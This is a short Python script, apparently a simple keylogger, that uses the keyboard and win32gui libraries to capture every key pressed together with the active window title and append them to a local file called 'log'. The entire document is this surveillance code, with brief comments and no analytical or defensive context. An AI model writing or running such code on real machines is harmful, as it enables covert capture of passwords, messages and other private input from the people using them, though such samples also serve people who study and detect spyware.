import keyboard
from win32gui import GetWindowText, GetForegroundWindow

while True:
    entry = f"Key Pressed: {keyboard.read_key()} Active Window: {GetWindowText(GetForegroundWindow())}" # make the entry by detecting the pressed key and active window
    print(entry) # for debugging purposes
    with open("log", "a") as log: # open the log file or make a new one if it doesnt exist
        log.write(entry) # write the entry into the log
    # Reads the key pressed and active window and writes it into a file.